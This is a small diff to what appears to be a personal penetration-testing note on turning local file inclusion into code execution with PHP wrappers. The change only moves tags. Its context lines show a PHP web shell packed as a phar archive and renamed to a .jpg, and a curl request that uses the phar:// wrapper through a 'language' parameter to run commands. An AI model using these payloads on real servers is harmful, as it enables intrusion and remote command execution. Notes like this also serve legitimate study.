@@ -1,3 +1,5 @@
+[[LFI]]
+[[php]]
 ##### Via LFI and PHP wrappers
 Encode PHP script in base64:
 ```bash
@@ -39,5 +41,3 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ```bash
 curl http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
-
-[[php]]
